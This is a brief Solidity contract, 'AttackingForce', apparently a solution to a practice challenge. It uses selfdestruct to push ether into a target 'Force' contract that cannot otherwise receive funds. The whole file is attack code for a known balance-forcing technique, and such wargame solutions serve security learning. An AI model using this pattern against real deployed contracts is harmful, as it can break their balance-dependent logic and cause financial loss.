// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Force.sol";

contract AttackingForce {
    address public contractAddress;
    Force public force;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
        force = Force(contractAddress);
    }

    function hackContract() external {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}
